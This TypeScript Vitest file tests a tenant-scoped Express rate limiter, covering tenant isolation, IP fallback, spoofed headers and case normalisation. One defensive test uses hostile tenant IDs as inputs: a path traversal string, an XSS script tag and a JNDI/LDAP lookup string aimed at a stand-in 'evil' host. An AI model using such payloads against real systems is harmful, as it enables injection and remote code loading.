/**
 * Tenant-scoped Rate Limiter Tests
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import type { Request, Response, NextFunction } from 'express';
import { createTenantRateLimiter } from '../rate-limit.js';

interface MockResponse extends Partial<Response> {
  statusCode: number;
  body: unknown;
  headers: Record<string, string | number | string[]>;
  headersSent: boolean;
}

function createMockReq(overrides: Partial<Request & { auth?: { tenantId?: string } }> = {}): Request {
  return {
    method: 'POST',
    path: '/api/v1/playbooks',
    ip: '203.0.113.50',
    socket: { remoteAddress: '203.0.113.50' },
    headers: {},
    auth: { tenantId: 'tenant-a' },
    ...overrides,
  } as Request;
}

function createMockRes(): MockResponse {
  const res: MockResponse = {
    statusCode: 200,
    body: null,
    headers: {},
    headersSent: false,
    setHeader: vi.fn(function (this: MockResponse, name: string, value: string | number | string[]) {
      this.headers[name] = value;
      return this as Response;
    }),
    status: vi.fn(function (this: MockResponse, code: number) {
      this.statusCode = code;
      return this as Response;
    }),
    json: vi.fn(function (this: MockResponse, data: unknown) {
      this.body = data;
      this.headersSent = true;
      return this as Response;
    }),
  };
  return res;
}

describe('createTenantRateLimiter', () => {
  let next: NextFunction;

  beforeEach(() => {
    next = vi.fn();
  });

  it('enforces per-tenant limits', async () => {
    const limiter = createTenantRateLimiter({ windowMs: 1000, maxRequests: 2 });

    const res1 = createMockRes();
    await limiter(createMockReq({ auth: { tenantId: 'tenant-a' } }), res1 as Response, next);

    const res2 = createMockRes();
    await limiter(createMockReq({ auth: { tenantId: 'tenant-a' } }), res2 as Response, next);

    const res3 = createMockRes();
    await limiter(createMockReq({ auth: { tenantId: 'tenant-a' } }), res3 as Response, next);

    expect(next).toHaveBeenCalledTimes(2);
    expect(res3.statusCode).toBe(429);
    expect(res3.body).toMatchObject({
      error: expect.any(String),
      retryAfter: 1,
    });
    expect(res3.headers['Retry-After']).toBe('1');
  });

  it('isolates limits across tenants', async () => {
    const limiter = createTenantRateLimiter({ windowMs: 1000, maxRequests: 1 });

    const res1 = createMockRes();
    await limiter(createMockReq({ auth: { tenantId: 'tenant-a' } }), res1 as Response, next);

    const res2 = createMockRes();
    await limiter(createMockReq({ auth: { tenantId: 'tenant-b' } }), res2 as Response, next);

    expect(next).toHaveBeenCalledTimes(2);
    expect(res1.statusCode).toBe(200);
    expect(res2.statusCode).toBe(200);
  });

  it('falls back to IP when tenant ID is missing', async () => {
    const limiter = createTenantRateLimiter({ windowMs: 1000, maxRequests: 1 });

    const res1 = createMockRes();
    await limiter(createMockReq({ auth: undefined, ip: '198.51.100.1' }), res1 as Response, next);

    const res2 = createMockRes();
    await limiter(createMockReq({ auth: undefined, ip: '198.51.100.2' }), res2 as Response, next);

    const res3 = createMockRes();
    await limiter(createMockReq({ auth: undefined, ip: '198.51.100.1' }), res3 as Response, next);

    expect(next).toHaveBeenCalledTimes(2);
    expect(res3.statusCode).toBe(429);
  });

  it('ignores spoofed tenant headers when auth context is present', async () => {
    const limiter = createTenantRateLimiter({ windowMs: 1000, maxRequests: 1 });

    const res1 = createMockRes();
    await limiter(
      createMockReq({
        auth: { tenantId: 'tenant-a' },
        headers: { 'x-tenant-id': ['tenant-a', 'tenant-b'] },
      }),
      res1 as Response,
      next
    );

    const res2 = createMockRes();
    await limiter(
      createMockReq({
        auth: { tenantId: 'tenant-a' },
        headers: { 'x-tenant-id': ['tenant-b', 'tenant-a'] },
      }),
      res2 as Response,
      next
    );

    expect(next).toHaveBeenCalledTimes(1);
    expect(res2.statusCode).toBe(429);
  });

  it('normalizes tenant IDs to prevent case-based bypass', async () => {
    const limiter = createTenantRateLimiter({ windowMs: 1000, maxRequests: 1 });

    const res1 = createMockRes();
    await limiter(createMockReq({ auth: { tenantId: 'tenant-1' } }), res1 as Response, next);

    const res2 = createMockRes();
    await limiter(createMockReq({ auth: { tenantId: 'TENANT-1' } }), res2 as Response, next);

    expect(next).toHaveBeenCalledTimes(1);
    expect(res2.statusCode).toBe(429);
  });

  it('falls back to IP for malformed tenant IDs', async () => {
    const limiter = createTenantRateLimiter({ windowMs: 1000, maxRequests: 2 });

    const res1 = createMockRes();
    await limiter(
      createMockReq({ auth: { tenantId: '../tenant-a' }, ip: '198.51.100.9' }),
      res1 as Response,
      next
    );

    const res2 = createMockRes();
    await limiter(
      createMockReq({ auth: { tenantId: '<script>alert(1)</script>' }, ip: '198.51.100.9' }),
      res2 as Response,
      next
    );

    const res3 = createMockRes();
    await limiter(
      createMockReq({ auth: { tenantId: '${jndi:ldap://evil}' }, ip: '198.51.100.9' }),
      res3 as Response,
      next
    );

    expect(next).toHaveBeenCalledTimes(2);
    expect(res3.statusCode).toBe(429);
  });

  it('does not allow IP rotation to bypass tenant limits', async () => {
    const limiter = createTenantRateLimiter({ windowMs: 1000, maxRequests: 1 });

    const res1 = createMockRes();
    await limiter(
      createMockReq({ auth: { tenantId: 'tenant-a' }, ip: '198.51.100.10' }),
      res1 as Response,
      next
    );

    const res2 = createMockRes();
    await limiter(
      createMockReq({ auth: { tenantId: 'tenant-a' }, ip: '198.51.100.11' }),
      res2 as Response,
      next
    );

    expect(next).toHaveBeenCalledTimes(1);
    expect(res2.statusCode).toBe(429);
  });
});
